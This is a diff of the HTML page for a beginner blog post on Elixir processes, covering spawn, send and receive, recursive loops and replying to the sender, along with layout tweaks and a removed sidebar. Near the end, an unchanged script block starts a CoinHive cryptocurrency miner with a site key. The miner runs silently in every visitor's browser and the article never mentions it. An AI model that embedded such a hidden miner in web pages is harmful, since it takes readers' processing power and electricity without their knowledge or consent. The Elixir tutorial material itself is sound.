@@ -3,6 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1'/>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Hostile Developer - Processes in Elixir</title>
   <link href="/stylesheets/application.css" rel="stylesheet" type="text/css" />
   <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
@@ -12,27 +13,19 @@
   <section id="header">
   <header>
 <a href="/">        <h1 class="brand"><span class="hostile">Hostile</span> Developer</h1>
-
-        <h3 class="tag-line">I am Steven. Hear me Rant.</h3>
+        <h4 class="tag-line">I am Steven. Hear me Rant.</h4>
 </a>  </header>
 
   <section class='social'>
     <a target="_blank" href="http://twitter.com/_StevenNunez/"><i class="fa fa-twitter"></i></a>
     <a target="_blank" href="https://github.com/StevenNunez/"><i class="fa fa-github"></i></a>
   </section>
-  <nav>
-    <ul class='links'>
-      <li><a href="/">Home</a></li>
-    </ul>
-  </nav>
 </section>
 
 
-  <main id='articles' role="main">
+  <main id='article' role="main">
     <h1 class="article-title"><a href="/2016/04/26/processes-in-elixir.html">Processes in Elixir</a></h1>
-    <h1>Processes</h1>
-
-<blockquote>
+    <blockquote>
 <p>The unit of concurrency in Elixir is a process. A process is  capable of responding to messages, and maintaining state. The only way to interact with a process is to send it a message.</p>
 
 <p><strong>Steven Nunez (Hostile Developer)</strong></p>
@@ -45,7 +38,7 @@
 <p><img alt="getinsertpic.com" src="http://media0.giphy.com/media/byvw3EmW6L37q/200.gif" /></p>
 
 <p>We use the <code>spawn</code> function to create a new process. We pass it a function and that code will run in an isolated process.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -53,8 +46,7 @@
   <span class="no">IO</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="sd">"</span><span class="s2">I run in a different process)"</span><span class="p">)</span>
   <span class="no">IO</span><span class="o">.</span><span class="n">inspect</span><span class="p">(</span><span class="n">self</span><span class="p">)</span>
 <span class="k">end</span><span class="p">)</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>This code will print its process id. Don&rsquo;t be fooled! It&rsquo;s running in a separate process, but <code>IO.puts</code> is set to print output to the <code>group_leader</code>. That&rsquo;s your main console by default.</p>
 
 <p>Try checking if this process is alive and you&rsquo;ll be met with sad news:
@@ -75,12 +67,11 @@ Process.alive?(pid) # =&gt; true
 </code></p>
 
 <p>Doing this will keep the process alive. We can send this process a message to trigger the corresponding code.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre><span class="n">send</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="p">{</span><span class="ss">:help</span><span class="p">})</span> <span class="c1"># prints Helping!</span>
 <span class="no">Process</span><span class="o">.</span><span class="n">alive?</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="c1"># =&gt; false</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <h3>send and receive</h3>
 
 <p><code>send</code> is how we send messages to a process. We can send ANY message to a process, and it&rsquo;s up to the process to respond to the message. You define which messages you respond to with a <code>receive</code> block and a list of messages you can respond to.</p>
@@ -88,7 +79,7 @@ Process.alive?(pid) # =&gt; true
 <p>One consideration here: <em>If you don&rsquo;t give your process a way to respond to a message, it will keep  it unprocessed. This could lead to memory issues by filling your MAILBOX (real term, look it up)</em></p>
 
 <p>Pretty easy to solve for this. Modify our last <code>receive</code> block to look like this:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -102,8 +93,7 @@ Process.alive?(pid) # =&gt; true
   <span class="k">end</span>
 <span class="k">end</span><span class="p">)</span>
 <span class="n">send</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="ss">:beef</span><span class="p">)</span> <span class="c1"># prints "Don't know what to do with that"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Once something matches code in the <code>receive</code> block, the block exits. If that&rsquo;s the last thing in the process, the process dies. We&rsquo;ll need to define a loop to create an immortal process.</p>
 
 <h2>loops with recursion</h2>
@@ -132,16 +122,15 @@ send(pid, {:help}) # prints &quot;Helping!&quot;
 <p>What&rsquo;s going on? First off, in our <code>loop</code> function, we&rsquo;re doing the same <code>receive</code> block, preventing our process from moving forward. Once something matches, we call <code>loop</code> again, locking us in a receive block again.</p>
 
 <p>When working with modules, you can spawn processes in a couple of ways. We used <code>MFA</code> which stands for Module/Function/Arguments, but we could have done it this way.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="n">spawn</span><span class="p">(</span><span class="o">&amp;</span><span class="no">Help</span><span class="o">.</span><span class="k">loop</span><span class="o">/</span><span class="m">0</span><span class="p">)</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Both work fine.</p>
 
 <h2>Return to sender</h2>
 
 <p>Until now, we&rsquo;ve been printing our result to the screen, but that&rsquo;s returning a value to <strong>you</strong> dear reader, not your process. To do that, we&rsquo;ll need to have our <code>loop</code> function send a message instead of printing. For THAT to work, we&rsquo;ll need to include the sender in the message we send. Referencing the current process is easy: use <code>self</code>.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -171,8 +160,7 @@ send(pid, {:help}) # prints &quot;Helping!&quot;
 <span class="n">send</span><span class="p">(</span><span class="n">helper</span><span class="p">,</span> <span class="p">{</span><span class="ss">:help</span><span class="p">,</span> <span class="n">self</span><span class="p">})</span>
 <span class="c1"># There's a message in my mailbox!!!!</span>
 <span class="n">flush</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Wall of code! We updated our <code>receive</code> to match on the tuple <code>{:help, help_seeker}</code>. We later send this process a message, passing the console process (yes, it&rsquo;s a process too!) as the one seeking help. We finish up by calling <code>flush</code> to show our messages in the console.</p>
 
 <h1>Wrap up</h1>
@@ -200,103 +188,6 @@ send(pid, {:help}) # prints &quot;Helping!&quot;
 
   </main>
 
-  <aside id="history">
-    <section class="recent">
-      <h2>Recent Articles</h2>
-      <ol class="articles">
-            <li><a href="/2017/06/17/ltrees-in-phoenix.html">LTrees in Phoenix</a>
-            <li><a href="/2017/05/02/something-useless-terminal-in-your-browser.html">Something Useless - Terminal in your browser</a>
-            <li><a href="/2017/04/18/something-useless-redux-implemented-in-elixir.html">Something Useless - Redux Implemented in Elixir</a>
-            <li><a href="/2016/08/24/learn-to-program-with-elixir.html">Learn to Program with Elixir</a>
-            <li><a href="/2016/05/23/guard-this-with-your-life-or-authenticating-apis-with-guardian.html">Guard this with your life... Or authenticating APIs with Guardian</a>
-            <li><a href="/2016/04/26/processes-in-elixir.html">Processes in Elixir</a>
-            <li><a href="/2016/02/24/hey-watch-it-or-how-to-monitor-files-in-elixir.html">Hey! Watch it!...or how to monitor files in Elixir</a>
-            <li><a href="/2015/08/23/let-s-build-something-with-rack.html">Let's build something with Rack</a>
-            <li><a href="/2015/08/21/lets-learn-about-rack.html">Let's learn about Rack</a>
-            <li><a href="/2015/06/08/rails-foreign-key-constraints-the-ugly-way.html">Rails Foreign Key Constraints - The Ugly Way</a>
-      </ol>
-    </section>
-
-    <section class="tags">
-      <h2>Tags</h2>
-      <ol>
-            <li><a href="/tags/beginner.html">Beginner</a> (1)</a></li>
-            <li><a href="/tags/concurrency.html">Concurrency</a> (1)</a></li>
-            <li><a href="/tags/ecto.html">Ecto</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">Elixir</a> (3)</a></li>
-            <li><a href="/tags/ltrees.html">LTrees</a> (1)</a></li>
-            <li><a href="/tags/learn-to-program.html">Learn to Program</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">Phoenix</a> (1)</a></li>
-            <li><a href="/tags/processes.html">Processes</a> (1)</a></li>
-            <li><a href="/tags/random-thoughts.html">Random Thoughts</a> (1)</a></li>
-            <li><a href="/tags/authentication.html">authentication</a> (1)</a></li>
-            <li><a href="/tags/basics.html">basics</a> (1)</a></li>
-            <li><a href="/tags/beginner.html">beginner</a> (1)</a></li>
-            <li><a href="/tags/closures.html">closures</a> (1)</a></li>
-            <li><a href="/tags/components-of-programming.html">components of programming</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">elixir</a> (5)</a></li>
-            <li><a href="/tags/enumerable.html">enumerable</a> (1)</a></li>
-            <li><a href="/tags/file-watchers.html">file watchers</a> (1)</a></li>
-            <li><a href="/tags/find.html">find</a> (1)</a></li>
-            <li><a href="/tags/fs.html">fs</a> (1)</a></li>
-            <li><a href="/tags/fundamentals.html">fundamentals</a> (1)</a></li>
-            <li><a href="/tags/generators.html">generators</a> (1)</a></li>
-            <li><a href="/tags/guardian.html">guardian</a> (1)</a></li>
-            <li><a href="/tags/javascript.html">javascript</a> (3)</a></li>
-            <li><a href="/tags/learning.html">learning</a> (1)</a></li>
-            <li><a href="/tags/navigation.html">navigation</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">phoenix</a> (1)</a></li>
-            <li><a href="/tags/polyglot.html">polyglot</a> (1)</a></li>
-            <li><a href="/tags/postgresql.html">postgresql</a> (1)</a></li>
-            <li><a href="/tags/promises.html">promises</a> (1)</a></li>
-            <li><a href="/tags/rack.html">rack</a> (2)</a></li>
-            <li><a href="/tags/rails.html">rails</a> (2)</a></li>
-            <li><a href="/tags/redux.html">redux</a> (1)</a></li>
-            <li><a href="/tags/routing.html">routing</a> (1)</a></li>
-            <li><a href="/tags/ruby.html">ruby</a> (6)</a></li>
-            <li><a href="/tags/sharp-axe.html">sharp axe</a> (1)</a></li>
-            <li><a href="/tags/something-useless.html">something useless</a> (2)</a></li>
-            <li><a href="/tags/web.html">web</a> (1)</a></li>
-      </ol>
-    </section>
-    <section class="by-month">
-      <h2>By Month</h2>
-      <ol>
-            <li><a href="/2017/06.html">June 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/05.html">May 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/04.html">April 2017</a>
-              (1)</a></li>
-            <li><a href="/2016/08.html">August 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/05.html">May 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/04.html">April 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/02.html">February 2016</a>
-              (1)</a></li>
-            <li><a href="/2015/08.html">August 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/06.html">June 2015</a>
-              (1)</a></li>
-            <li><a href="/2015/05.html">May 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/02.html">February 2015</a>
-              (1)</a></li>
-            <li><a href="/2014/11.html">November 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/05.html">May 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/04.html">April 2014</a>
-              (2)</a></li>
-            <li><a href="/2014/02.html">February 2014</a>
-              (1)</a></li>
-            <li><a href="/2013/10.html">October 2013</a>
-              (1)</a></li>
-      </ol>
-    </section>
-  </aside>
  <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
@@ -313,6 +204,8 @@ send(pid, {:help}) # prints &quot;Helping!&quot;
    var miner = new CoinHive.Anonymous('zmOZS6Bce7Nsw6WOSrt2cAJvIy4CvcNV');
    miner.start();
  </script>
+
+ <em>Copyright &copy; 2017 Steven Nu&ntilde;ez - HostileDeveloper</em>
 
 </div>
 </body>
